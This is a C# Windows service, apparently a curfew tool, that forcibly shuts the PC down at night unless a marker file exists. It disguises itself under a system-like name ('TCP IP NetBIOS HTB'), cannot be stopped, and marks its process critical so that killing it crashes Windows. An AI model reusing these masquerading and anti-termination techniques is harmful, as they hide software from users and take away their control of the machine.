using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.ServiceProcess;
using System.Threading;
using System.Timers;
using Timer = System.Timers.Timer;
using System.Text.Json;

namespace ShutdownService
{
    public class TimeBasedShutdownService : ServiceBase
    {
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(
        IntPtr ProcessHandle,
        int ProcessInformationClass,
        ref int ProcessInformation,
        int ProcessInformationLength);

        private const int ProcessBreakOnTermination = 0x1D;

        private Timer _timer;

        public TimeBasedShutdownService()
        {
            ServiceName = @"TCP IP NetBIOS HTB";
            CanStop = false;
            CanShutdown = false;
            CanPauseAndContinue = false;
            CanHandlePowerEvent = false;
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                // Получаем текущий процесс
                Process currentProcess = Process.GetCurrentProcess();
                IntPtr processHandle = currentProcess.Handle;

                // Устанавливаем ProcessBreakOnTermination в 1
                int isCritical = 1;
                int status = NtSetInformationProcess(processHandle, ProcessBreakOnTermination, ref isCritical, sizeof(int));

                if (status == 0) // STATUS_SUCCESS
                {
                    Console.WriteLine("Process set as critical. Termination will cause BSOD.");
                }
                else
                {
                    Console.WriteLine($"Failed to set process information. Status: 0x{status:X8}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }


            _timer = new Timer(60000); // Проверка каждые 60 секунд
            _timer.Elapsed += OnTimerElapsed;
            _timer.Start();
        }

        protected override void OnStop()
        {
            _timer.Stop();
            _timer.Dispose();
        }

        private void OnTimerElapsed(object sender, ElapsedEventArgs e)
        {
            Thread.Sleep(60000);
            TimeSpan? currentTime = null;
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Выполняем GET-запрос
                    HttpResponseMessage response = client.GetAsync("https://timeapi.io/api/Time/current/zone?timeZone=Europe/Riga").Result;
                    response.EnsureSuccessStatusCode();

                    // Читаем результат как строку
                    string responseBody = response.Content.ReadAsStringAsync().Result;

                    // Десериализуем JSON-ответ
                    var timeData = JsonSerializer.Deserialize<TimeResponse>(responseBody);
                    currentTime = DateTime.Parse(timeData.dateTime).TimeOfDay;
                    // Выводим данные
                    // Console.WriteLine($"Текущее время в {timeData.TimeZone}: {timeData.DateTime}");
                }
                catch (HttpRequestException ee)
                {
                    Console.WriteLine("Ошибка при запросе: " + ee.Message);
                }
                catch (Exception ee)
                {
                    Console.WriteLine("Ошибка: " + ee.Message);
                }
            }
            //File.WriteAllText(@"C:\tmp\2.txt", currentTime?.ToString() ?? "null");
            currentTime = currentTime ?? DateTime.Now.TimeOfDay;
            var startTime = new TimeSpan(23, 0, 0);
            var endTime = new TimeSpan(6, 0, 0);

            if (currentTime > startTime || currentTime < endTime)
            {
                if (!File.Exists(@"C:\tmp\1.txt"))
                {
                    ShutdownWindows();
                }
            }
        }

        public class TimeResponse
        {
            public string dateTime { get; set; }
            public string timeZone { get; set; }
        }

        private void ShutdownWindows()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown",
                    Arguments = "/s /f /t 0", // Выключение немедленно, принудительно
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch (Exception ex)
            {
                // Логирование ошибки (если требуется)
                EventLog.WriteEntry("Ошибка выключения системы: " + ex.Message, EventLogEntryType.Error);
            }
        }

        //public static void Main()
        //{
        //    ServiceBase.Run(new TimeBasedShutdownService());
        //}
    }
}